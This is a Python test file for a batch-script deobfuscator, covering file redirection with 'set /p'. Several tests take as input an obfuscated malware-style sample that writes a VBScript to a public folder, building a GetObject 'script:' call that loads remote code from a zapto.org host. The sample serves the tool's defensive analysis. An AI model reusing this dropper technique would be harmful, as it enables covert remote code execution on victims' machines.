import pytest

from batch_deobfuscator.batch_interpreter import BatchDeobfuscator


@pytest.mark.parametrize(
    "cmd, fs",
    [
        ('set/p str="a"a" "<nul>out.txt', ["out.txt"]),
        ('set/p str="a"a" "<nul>OUt.tXt', ["out.txt"]),
        ('set/p str="a"a" ">out.txt<nul', ["out.txt"]),
        ('set/p str="a"a" ">out.txt', ["out.txt"]),
        ('set/p str="a"a" "<nul', []),
        ('set/p str="a"a" "<nul > out.txt', ["out.txt"]),
    ],
)
def test_set_redirection(cmd, fs):
    deobfuscator = BatchDeobfuscator()
    deobfuscator.interpret_command(cmd)
    assert list(deobfuscator.modified_filesystem.keys()) == fs
    if fs:
        assert deobfuscator.modified_filesystem["out.txt"]["content"] == 'a"a" '


def test_create_append_file():
    deobfuscator = BatchDeobfuscator()
    cmd1 = r'set /p="OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetOb" 1>C:\Users\Public\\Xdg72.vbs'
    cmd2 = r'set /p="ject("sC"+hFZJ41+"pt"+TpBqgV66+"ht"+"Tps"+TpBqgV66+"//sub"+OO1v38+"zapto"+OO1v38+"org//"+eWp10+"1")^">>C:\Users\Public\\Xdg72.vbs'
    deobfuscator.interpret_command(cmd1)
    assert len(deobfuscator.traits) == 1
    assert len(deobfuscator.traits["setp-file-redirection"]) == 1
    assert deobfuscator.traits["setp-file-redirection"][0] == (
        cmd1,
        r"C:\Users\Public\\Xdg72.vbs",
    )
    assert deobfuscator.modified_filesystem[r"C:\Users\Public\\Xdg72.vbs".lower()] == {
        "type": "content",
        "content": r'OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetOb',
    }
    deobfuscator.interpret_command(cmd2)
    assert len(deobfuscator.traits) == 1
    assert len(deobfuscator.traits["setp-file-redirection"]) == 2
    assert deobfuscator.traits["setp-file-redirection"][1] == (
        cmd2,
        r"C:\Users\Public\\Xdg72.vbs",
    )
    assert deobfuscator.modified_filesystem[r"C:\Users\Public\\Xdg72.vbs".lower()] == {
        "type": "content",
        "content": r'OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetObject("sC"+hFZJ41+"pt"+TpBqgV66+"ht"+"Tps"+TpBqgV66+"//sub"+OO1v38+"zapto"+OO1v38+"org//"+eWp10+"1")',
    }


def test_create_append_file_with_stderr():
    deobfuscator = BatchDeobfuscator()
    cmd1 = r'set /p="OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetOb" 1>C:\Users\Public\\Xdg72.vbs 2>nul'
    cmd2 = r'set /p="ject("sC"+hFZJ41+"pt"+TpBqgV66+"ht"+"Tps"+TpBqgV66+"//sub"+OO1v38+"zapto"+OO1v38+"org//"+eWp10+"1")^">>C:\Users\Public\\Xdg72.vbs 2>nul'
    deobfuscator.interpret_command(cmd1)
    assert len(deobfuscator.traits) == 1
    assert len(deobfuscator.traits["setp-file-redirection"]) == 1
    assert deobfuscator.traits["setp-file-redirection"][0] == (
        cmd1,
        r"C:\Users\Public\\Xdg72.vbs",
    )
    assert deobfuscator.modified_filesystem[r"C:\Users\Public\\Xdg72.vbs".lower()] == {
        "type": "content",
        "content": r'OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetOb',
    }
    deobfuscator.interpret_command(cmd2)
    assert len(deobfuscator.traits) == 1
    assert len(deobfuscator.traits["setp-file-redirection"]) == 2
    assert deobfuscator.traits["setp-file-redirection"][1] == (
        cmd2,
        r"C:\Users\Public\\Xdg72.vbs",
    )
    assert deobfuscator.modified_filesystem[r"C:\Users\Public\\Xdg72.vbs".lower()] == {
        "type": "content",
        "content": r'OO1v38=".":hFZJ41="ri":eWp10="g":TpBqgV66=":":GetObject("sC"+hFZJ41+"pt"+TpBqgV66+"ht"+"Tps"+TpBqgV66+"//sub"+OO1v38+"zapto"+OO1v38+"org//"+eWp10+"1")',
    }


def test_empty_content():
    deobfuscator = BatchDeobfuscator()
    cmd1 = r'set /p pidvalue=<"C:\TEMP\~pid.txt" >nul 2>nul'
    deobfuscator.interpret_command(cmd1)
    assert deobfuscator.variables["pidvalue"] == "__input__"
